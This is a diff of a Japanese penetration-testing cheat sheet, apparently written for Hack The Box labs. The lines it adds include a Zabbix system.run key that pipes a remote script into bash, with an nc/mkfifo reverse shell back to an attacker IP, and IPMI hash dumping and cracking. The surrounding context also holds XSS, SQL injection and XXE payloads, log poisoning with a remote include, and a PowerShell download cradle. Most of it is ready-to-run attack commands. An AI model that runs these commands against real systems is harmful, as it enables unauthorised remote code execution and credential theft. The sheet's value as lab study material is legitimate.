@@ -303,7 +303,7 @@ sudo emacs /etc/hosts
 10.10.10.1  admin.htb
 ```
 
-### サブドメインの列挙
+### Subdomainの列挙
 #### Gobuster(DNSモード)
 DNSサブドメインのブルートフォース。  
 -dオプションで指定したドメインのサブドメインを見つけるために使用する。
@@ -319,11 +319,12 @@ gobuster dns -d test.com -w subdomains-top1mil-5000.txt -i
 gobuster vhost -u http://test.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
 ```
 
-### ffuf
+### ^ffuf(subdomain)
 ```
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u http://website.com/ -H “Host: FUZZ.website.com”
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb"
+
 # 単語の量でフィルタリング
-ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 3913
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -fw 18
 ```
 - -fw...単語の量でフィルタリング(一つ目のコマンドで表示された最も多いsizeの値を指定)
 - -fl...行数でフィルタリング
@@ -386,7 +387,7 @@ ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -e .php,txt -v > output.txt
 - -v...冗長な出力
 - -o...結果をファイルに出力
 
-### Nikto
+### ^Nikto
 ```
 nikto -h <url> -Format txt -o <output filename>
 ```
@@ -397,7 +398,7 @@ nikto -h <url> -Format txt -o <output filename>
 - -ssl...SSLを使用するサイトで使用
 - -maxtime=30s...指定された時間後にスキャンを停止
 
-### BurpSuite
+### ^BurpSuite
 ローカルプロキシツール。  
 通信の改ざんをするために使用。  
 他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
@@ -499,7 +500,7 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
 impacket-secretsdump -sam SAM -security -system SYSTEM local
 ```
 
-#### Log Poisoning(LFI2RCE)
+#### ^Log Poisoning(LFI2RCE)
 ログファイルにペイロードを書き込んで、LFIを利用してアクセスすることでペイロードを実行する。  
 
 apache2:  
@@ -530,7 +531,7 @@ allow_url_includeオプションがONになっている場合に有効。
 http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
 ```
 
-### XSS(クロスサイトスクリプティング)
+### ^XSS(クロスサイトスクリプティング)
 ```
 <script>alert(1);</script>
 "><script>alert(1);</script>
@@ -560,7 +561,7 @@ http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
 # メールアドレスの変更によるパスワードリセット攻撃
 <script>user.changeEmail('attacker@hacker.thm');</script>
 ```
-### SQLインジェクション
+### ^SQLインジェクション
 ・後ろのスペースを入れて使用
 ```
 admin' --
@@ -581,10 +582,10 @@ SQLmap:
 sqlmap -u http://192.168.56.1/vuln.php?id=1
 sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
 ```
-### NoSQLインジェクション
+### ^NoSQLインジェクション
 []
 
-### XXE(XML External Entitiy)
+### ^XXE(XML External Entitiy)
 下のエクスプロイトでは、&xxe;と記述した箇所でfile:///etc/passwdを実行させている。
 ```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
@@ -911,6 +912,22 @@ scriptblock="iex (New-Object Net.WebClient).DownloadString('http://10.10.10.1:80
 echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
 cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
 ```
+
+## Zabbix
+### reverse shell(Authorization)
+[Configuration]→[Hosts]→ホストを選択→[Items]→右上の[Create items]→[key]に以下の内容を記述→下部の[Test]を押下→[Get Value and test]
+```
+# key
+system.run[curl http://10.10.14.9:8000/shell.sh | bash,nowait]
+
+# Attacker Host
+echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f' > shell.sh
+python3 -m http.server 8000
+```
+
+EXPLOIT ZABBIX FOR REVERSE SHELL:  
+https://rioasmara.com/2022/04/16/exploit-zabbix-for-reverse-shell/
+
 
 ### Wappalyzer
 Wappalyzerは、フレームワーク、コンテンツ管理システム(CMS)などのWebサイトが使用しているテクノロジーを特定するのに役立つオンラインツールおよびブラウザー拡張機能。バージョン番号も検索する。  
@@ -1245,6 +1262,26 @@ iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable 
 9.0.30729.4148"
 iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86)
 ```
+
+## IPMI(623)
+```
+# ポート開放の確認
+sudo nmap -sU -p 623 -sC -sV 10.10.11.124
+
+# バージョン特定
+msf6 > use auxiliary/scanner/ipmi/ipmi_version
+
+# IPMI2.0の脆弱性を利用したパスワードハッシュのダンプ
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+# ダンプしたパスワードハッシュのクラック
+hashcat -m 7300 hash /usr/share/wordlist/rockyou.txt
+
+# impipwner.pyを利用したパスワードハッシュのダンプとクラック
+sudo python3 ipmipwner.py --host 10.10.11.124 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
+```
+
+ipmiPwner:  
+https://github.com/c0rnf13ld/ipmiPwner
 
 ## Oracle TNS Listener(1521)
 ODAT(Oracle Database Attacking Tool):  
@@ -1638,10 +1675,22 @@ No password hashes left to crack (see FAQ)
 
 ## hashcat
 ```
-hashcat -m 0 -a 0 <パスワードファイル>　/usr/share/wordlist/rockyou.txt
+cat hash
+cfdfb19f82040000f6b12fdf632b23aceb8772cdbf5bb7....snip
+
+hashcat -m 0 hash /usr/share/wordlist/rockyou.txt
 ```
-- -m 0 = MD5
-- -a 0 = 辞書攻撃
+- -m 0...MD5
+- -m 100...SHA1
+- -m 500...md5crypt $1$, MD5(Unix) 
+- -m 1000...NTLM
+- -m 1400...SHA-256
+- -m 1700...SHA-512
+- -m 1800...sha512crypt $6$, SHA512(Unix)
+- -m 3000...LM
+- -m 7300...IPMI2
+- -m 7400...sha256crypt $5$, SHA256(Unix)
+- --user...ユーザ名も入れたハッシュをクラック(Administrator:cfdfb19f82040000f....)
 
 Hash type:
 https://hashcat.net/wiki/doku.php?id=example_hashes
@@ -3490,6 +3539,9 @@ https://www.exploit-db.com/exploits/45010
 
 Webmin-1.910-Exploit-Script:  
 https://github.com/roughiz/Webmin-1.910-Exploit-Script
+
+MariaDB 10.2-'wsrep_provider' OS Command Execution
+https://github.com/shamo0/CVE-2021-27928-POC
 ```
 
 ## Initial Shell(Windows)
